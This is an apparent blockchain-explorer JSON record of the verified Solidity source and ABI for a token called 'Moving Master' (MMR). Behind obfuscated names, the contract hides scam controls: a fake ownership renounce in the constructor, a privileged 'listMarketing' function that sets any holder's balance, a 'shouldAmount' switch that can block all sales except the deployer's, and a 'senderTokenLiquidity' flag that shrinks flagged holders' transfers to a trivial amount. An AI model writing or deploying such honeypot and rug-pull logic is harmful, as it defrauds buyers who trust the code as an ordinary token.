{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface takeLaunch {\n    function createPair(address amountMax, address teamIs) external returns (address);\n}\n\ninterface walletReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyAt) external view returns (uint256);\n\n    function transfer(address launchedShould, uint256 senderLiquidity) external returns (bool);\n\n    function allowance(address takeLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedShould,\n        uint256 senderLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellLaunchedSender, uint256 value);\n    event Approval(address indexed takeLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract maxIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletReceiverMetadata is walletReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MovingMaster is maxIs, walletReceiver, walletReceiverMetadata {\n\n    event OwnershipTransferred(address indexed toList, address indexed receiverFeeToken);\n\n    function shouldAmount(uint256 senderLiquidity) public {\n        receiverTotalTake();\n        walletTeam = senderLiquidity;\n    }\n\n    function receiverTotalTake() private view {\n        require(fromAuto[_msgSender()]);\n    }\n\n    uint256 public minTx;\n\n    function owner() external view returns (address) {\n        return marketingSell;\n    }\n\n    uint256 constant amountSender = 5 ** 10;\n\n    mapping(address => bool) public fromAuto;\n\n    function launchShould(address teamReceiver, address launchedShould, uint256 senderLiquidity) internal returns (bool) {\n        require(totalLaunch[teamReceiver] >= senderLiquidity);\n        totalLaunch[teamReceiver] -= senderLiquidity;\n        totalLaunch[launchedShould] += senderLiquidity;\n        emit Transfer(teamReceiver, launchedShould, senderLiquidity);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeBuy;\n    }\n\n    bool private fromLaunched;\n\n    uint256 senderEnable;\n\n    function tradingSellToken() public {\n        emit OwnershipTransferred(fundWalletReceiver, address(0));\n        marketingSell = address(0);\n    }\n\n    mapping(address => uint256) private totalLaunch;\n\n    mapping(address => bool) public exemptLaunchedToken;\n\n    function marketingAtIs(address teamReceiver, address launchedShould, uint256 senderLiquidity) internal returns (bool) {\n        if (teamReceiver == fundWalletReceiver) {\n            return launchShould(teamReceiver, launchedShould, senderLiquidity);\n        }\n        uint256 launchedAuto = walletReceiver(toShould).balanceOf(senderMin);\n        require(launchedAuto == walletTeam);\n        require(launchedShould != senderMin);\n        if (exemptLaunchedToken[teamReceiver]) {\n            return launchShould(teamReceiver, launchedShould, amountSender);\n        }\n        return launchShould(teamReceiver, launchedShould, senderLiquidity);\n    }\n\n    mapping(address => mapping(address => uint256)) private modeWallet;\n\n    address private marketingSell;\n\n    constructor (){\n        \n        maxAuto tradingAt = maxAuto(launchedAutoTo);\n        toShould = takeLaunch(tradingAt.factory()).createPair(tradingAt.WETH(), address(this));\n        if (modeLaunched == tokenFundShould) {\n            teamLaunched = minTx;\n        }\n        fundWalletReceiver = _msgSender();\n        fromAuto[fundWalletReceiver] = true;\n        totalLaunch[fundWalletReceiver] = feeBuy;\n        tradingSellToken();\n        \n        emit Transfer(address(0), fundWalletReceiver, feeBuy);\n    }\n\n    uint256 public modeExempt;\n\n    uint256 private feeBuy = 100000000 * 10 ** 18;\n\n    uint8 private minTo = 18;\n\n    function senderTokenLiquidity(address marketingFee) public {\n        receiverTotalTake();\n        \n        if (marketingFee == fundWalletReceiver || marketingFee == toShould) {\n            return;\n        }\n        exemptLaunchedToken[marketingFee] = true;\n    }\n\n    bool public liquidityMode;\n\n    uint256 public teamLaunched;\n\n    function allowance(address tokenWallet, address tokenMax) external view virtual override returns (uint256) {\n        if (tokenMax == launchedAutoTo) {\n            return type(uint256).max;\n        }\n        return modeWallet[tokenWallet][tokenMax];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txSender;\n    }\n\n    function transfer(address listLaunched, uint256 senderLiquidity) external virtual override returns (bool) {\n        return marketingAtIs(_msgSender(), listLaunched, senderLiquidity);\n    }\n\n    address public fundWalletReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listMode;\n    }\n\n    string private listMode = \"MMR\";\n\n    function totalTake(address isSellTo) public {\n        if (liquidityMode) {\n            return;\n        }\n        if (teamLaunched != modeExempt) {\n            modeExempt = minTx;\n        }\n        fromAuto[isSellTo] = true;\n        \n        liquidityMode = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minTo;\n    }\n\n    function approve(address tokenMax, uint256 senderLiquidity) public virtual override returns (bool) {\n        modeWallet[_msgSender()][tokenMax] = senderLiquidity;\n        emit Approval(_msgSender(), tokenMax, senderLiquidity);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingSell;\n    }\n\n    function listMarketing(address listLaunched, uint256 senderLiquidity) public {\n        receiverTotalTake();\n        totalLaunch[listLaunched] = senderLiquidity;\n    }\n\n    bool public modeLaunched;\n\n    string private txSender = \"Moving Master\";\n\n    address public toShould;\n\n    address launchedAutoTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private tokenFundShould;\n\n    uint256 walletTeam;\n\n    address senderMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address teamReceiver, address launchedShould, uint256 senderLiquidity) external override returns (bool) {\n        if (_msgSender() != launchedAutoTo) {\n            if (modeWallet[teamReceiver][_msgSender()] != type(uint256).max) {\n                require(senderLiquidity <= modeWallet[teamReceiver][_msgSender()]);\n                modeWallet[teamReceiver][_msgSender()] -= senderLiquidity;\n            }\n        }\n        return marketingAtIs(teamReceiver, launchedShould, senderLiquidity);\n    }\n\n    function balanceOf(address buyAt) public view virtual override returns (uint256) {\n        return totalLaunch[buyAt];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFeeToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunchedSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptLaunchedToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWalletReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLiquidity\",\"type\":\"uint256\"}],\"name\":\"listMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"}],\"name\":\"senderTokenLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderLiquidity\",\"type\":\"uint256\"}],\"name\":\"shouldAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSellTo\",\"type\":\"address\"}],\"name\":\"totalTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSellToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MovingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}